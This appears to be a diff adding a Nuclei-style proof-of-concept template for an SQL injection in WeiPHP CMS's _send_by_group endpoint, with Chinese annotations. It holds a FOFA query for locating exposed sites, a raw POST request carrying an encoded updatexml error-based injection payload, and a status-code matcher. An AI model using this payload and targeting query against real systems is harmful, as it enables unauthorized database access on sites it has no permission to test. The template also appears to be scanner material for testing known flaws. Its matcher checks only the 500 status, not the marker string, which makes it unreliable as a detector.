@@ -1,0 +1,40 @@
+id: poc-fqhv1lgu2wa2z94l
+info:
+  name: weiphp cms _send_by_group sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fqhv1lgu2wa2z94l'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fqhv1lgu2wa2z94l
+    fofa: body="/css/weiphp.css" || body="WeiPHP"
+http:
+- raw:
+  - 'POST /public/index.php/weixin/message/_send_by_group HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+--
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    123456ww
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
